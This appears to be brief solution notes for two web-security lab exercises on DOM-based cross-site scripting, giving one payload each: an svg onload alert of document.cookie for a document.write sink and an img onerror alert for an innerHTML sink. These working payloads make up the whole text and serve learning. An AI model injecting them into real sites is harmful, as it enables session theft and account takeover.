DOM XSS in document.write sink using source location.search

mypayload"><svg onload=alert(document.cookie)>


DOM XSS in innerHTML sink using source location.search

mypayload<img src='x' onerror='alert(1)'>

